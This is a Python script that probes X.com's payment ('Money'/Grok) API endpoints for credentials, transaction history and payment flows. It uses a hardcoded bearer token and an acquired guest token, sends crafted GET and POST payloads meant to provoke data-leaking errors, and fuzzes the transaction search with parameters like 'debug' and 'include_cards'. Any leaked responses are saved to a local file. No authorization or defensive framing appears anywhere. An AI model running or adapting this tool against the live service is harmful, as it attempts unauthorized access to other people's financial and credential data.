import requests
import time
import json
import random
import string
import uuid
from colorama import Fore, init

init(autoreset=True)

# Target Endpoints (X.com / Grok Money)
MONEY_TARGETS = [
    # Credential Management
    "https://x.com/i/money/credentials/create",
    "https://x.com/i/money/credentials/update",
    "https://x.com/i/money/credentials/list",
    
    # Transaction History (The "Money" Stream)
    "https://x.com/i/money/grok-transaction-search-history",
    "https://x.com/i/money/grok-transaction-search-feedback",
    
    # Payment Flows
    "https://x.com/i/money/chat",
    "https://x.com/i/money/consent",
    "https://x.com/i/money/reonboard",
    
    # GraphQL related (inferred)
    "https://x.com/i/api/graphql/UserMoneySettings", 
    "https://x.com/i/api/1.1/strato/column/None/list.json" # Often leaks internal structures
]

HEADERS = {
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
    "Authorization": "Bearer AAAAAAAAAAAAAAAAAAAAANRILgAAAAAAnNwIzUejRCOuH5E6I8xnZz4puTs%3D1Zv7ttfk8LF81IUq16cHjhLTvJu4FA33AGWWjCpTnA",
    "Content-Type": "application/json",
    "x-twitter-active-user": "yes",
    "x-twitter-client-language": "en",
    "Origin": "https://x.com",
    "Referer": "https://x.com/"
}

def get_guest_token():
    try:
        r = requests.post("https://api.x.com/1.1/guest/activate.json", headers=HEADERS, timeout=5)
        if r.status_code == 200:
            return r.json()["guest_token"]
    except Exception as e:
        print(f"{Fore.RED}[!] Failed to get Guest Token: {e}")
    return None

def probe_money_api():
    print(f"{Fore.MAGENTA}=== Probing X Money/Grok API for Transaction Data ===")
    
    # 1. Get Guest Token
    guest_token = get_guest_token()
    if guest_token:
        print(f"{Fore.GREEN}[+] Acquired Guest Token: {guest_token}")
        HEADERS["x-guest-token"] = guest_token
    else:
        print(f"{Fore.RED}[-] Proceeding without Guest Token (Expect Failures)")

    # 2. Probe Endpoints
    for url in MONEY_TARGETS:
        print(f"\n{Fore.YELLOW}[*] Target: {url}")
        
        # GET Request
        try:
            r = requests.get(url, headers=HEADERS, timeout=5)
            status_color = Fore.GREEN if r.status_code in [200, 400, 422] else Fore.RED
            print(f"    GET: {status_color}{r.status_code} {Fore.RESET}(Len: {len(r.text)})")
            
            # Check for leaked data in 200 OK responses (ignore HTML)
            if r.status_code == 200 and "<html" not in r.text[:50]:
                print(f"{Fore.GREEN}    [!!!] POTENTIAL LEAK: {r.text[:300]}")
                with open("money_leak.json", "w") as f:
                    f.write(r.text)
            elif r.status_code in [400, 401, 403]:
                 # Check specific error messages
                 try:
                     err = r.json()
                     msg = err.get('errors', [{}])[0].get('message', 'Unknown')
                     print(f"    [-] Error: {msg}")
                 except:
                     pass

        except Exception as e:
            print(f"{Fore.RED}    [!] Error: {e}")

        # POST Request (Attempt to trigger backend processing)
        try:
            # Payload designed to trigger validation errors that leak info
            payload = {
                "transaction_id": str(uuid.uuid4()),
                "grok_id": "0",
                "query": "test",
                "amount": 100,
                "currency": "USD",
                "credential_id": "test_cred_123"
            }
            r = requests.post(url, headers=HEADERS, json=payload, timeout=5)
            print(f"    POST: {r.status_code} (Len: {len(r.text)})")
            
            if r.status_code == 200 and "<html" not in r.text[:50]:
                print(f"{Fore.GREEN}    [!!!] POST LEAK: {r.text[:300]}")
        except:
            pass

    # 3. Fuzzing Transaction Search
    print(f"\n{Fore.CYAN}=== Fuzzing Transaction Search ===")
    search_url = "https://x.com/i/money/grok-transaction-search-history"
    # Try different query params
    params = ["?q=*", "?start_date=2024-01-01", "?limit=100", "?debug=true", "?include_cards=true"]
    
    for p in params:
        full_url = search_url + p
        try:
            r = requests.get(full_url, headers=HEADERS, timeout=5)
            if r.status_code != 403 and r.status_code != 404:
                 print(f"{Fore.GREEN}[+] Interesting Response for {p}: {r.status_code}")
        except:
            pass

if __name__ == "__main__":
    probe_money_api()
